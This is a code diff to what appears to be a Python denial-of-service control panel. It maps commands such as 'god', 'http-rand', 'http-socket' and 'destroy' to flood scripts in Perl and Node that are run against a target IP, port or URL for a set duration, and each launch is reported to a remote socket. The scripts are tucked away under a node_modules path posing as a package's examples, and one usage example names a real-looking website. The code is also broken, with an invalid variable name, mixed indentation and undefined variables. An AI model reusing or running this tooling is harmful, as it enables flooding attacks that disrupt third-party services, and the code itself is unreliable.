@@ -80,62 +80,60 @@ def main():
 #177MEMBERS
 	elif "god" in cnc:
             try:
-                url = cnc.split()[1]
-                thread = cnc.split()[2]
-                rpc = cnc.split()[3]
-                time = cnc.split()[4]
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                time = cnc.split()[3]
+                device_name = platform.system()
                 sendsocket(socket_url, f"\n\n---------------\nFLOOD\n---------------\nTarget: {url}\nThreads: {thread}\nRpc: {rpc}\nTime: {time}\n---------------\n‎ \n‎ \n‎ ")
-                flood = os.path.join("node_modules/randomstring/examples/methods", "flood.py")
-                os.system(f'python3 {flood} {url} {thread} {rpc} {time}')
+                god = os.path.join("node_modules/randomstring/examples/methods", "god.pl")
+                 os.system(f'perl god.pl {ip} {port} 65500 {time}')
             except IndexError:
-                print('Usage: flood <target> <workers> <rpc> <timer>')
-                print('Example: flood https://example.com 500 250 60')
+               print('Usage: god <ip> <port> <time>')
+               print('Example: god 1.1.1.1 80 60')
 
         elif "http-rand" in cnc:
             try:
                 url = cnc.split()[1]
-                thread = cnc.split()[2]
-                rpc = cnc.split()[3]
-                time = cnc.split()[4]
+                time = cnc.split()[2]
                 sendsocket(socket_url, f"\n\n---------------\nFLOOD\n---------------\nTarget: {url}\nThreads: {thread}\nRpc: {rpc}\nTime: {time}\n---------------\n‎ \n‎ \n‎ ")
-                flood = os.path.join("node_modules/randomstring/examples/methods", "flood.py")
-                os.system(f'python3 {flood} {url} {thread} {rpc} {time}')
+                HTTP-RAND = os.path.join("node_modules/randomstring/examples/methods", "HTTP-RAND.js")
+                os.system(f'node HTTP-RAND.js {url} {time}')
             except IndexError:
-                print('Usage: flood <target> <workers> <rpc> <timer>')
-                print('Example: flood https://example.com 500 250 60')
+                print('Usage: http-rand <url> <time>')
+                print('Example: http-rand http://vailon.com/ 60')
                 
         elif "http-socket" in cnc:
             try:
                 url = cnc.split()[1]
-                thread = cnc.split()[2]
-                rpc = cnc.split()[3]
-                time = cnc.split()[4]
+                per = cnc.split()[2]
+                time = cnc.split()[3]
+                device_name = platform.system()
                 sendsocket(socket_url, f"\n\n---------------\nFLOOD\n---------------\nTarget: {url}\nThreads: {thread}\nRpc: {rpc}\nTime: {time}\n---------------\n‎ \n‎ \n‎ ")
-                flood = os.path.join("node_modules/randomstring/examples/methods", "flood.py")
-                os.system(f'python3 {flood} {url} {thread} {rpc} {time}')
+                socket = os.path.join("node_modules/randomstring/examples/methods", "HTTP-SOCKET.js")
+                os.system(f'node HTTP-SOCKET {url} {per} {time}')
             except IndexError:
-                print('Usage: flood <target> <workers> <rpc> <timer>')
-                print('Example: flood https://example.com 500 250 60')
-
+                print('Usage: http-socket <url> <per> <time>')
+                print('Example: http-socket http://example.com 5000 60')
+		    
 	elif "destroy" in cnc:
             try:
-                url = cnc.split()[1]
-                thread = cnc.split()[2]
-                rpc = cnc.split()[3]
-                time = cnc.split()[4]
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                time = cnc.split()[3]
+		device_name = platform.system()
                 sendsocket(socket_url, f"\n\n---------------\nFLOOD\n---------------\nTarget: {url}\nThreads: {thread}\nRpc: {rpc}\nTime: {time}\n---------------\n‎ \n‎ \n‎ ")
-                flood = os.path.join("node_modules/randomstring/examples/methods", "destroy.pl")
-                os.system(f'python3 {flood} {url} {thread} {rpc} {time}')
+                destroy = os.path.join("node_modules/randomstring/examples/methods", "destroy.pl")
+		os.system(f'perl destroy.pl {ip} {port} 65500 {time}')
             except IndexError:
-                print('Usage: flood <target> <workers> <rpc> <timer>')
-                print('Example: flood https://example.com 500 250 60')
+                print('Usage: destroy <ip> <port> <time>')
+                print('Example: destroy 1.1.1.1 80 60')
                 
                 
 	    
         else:
             try:
                 cmmnd = cnc.split()[0]
-                print("Method: [ " + cmmnd + " ] Tidak Di Temukan!")
+                print("Method: [ " + cmmnd + " ] Not Found!")
             except IndexError:
                 pass
                 
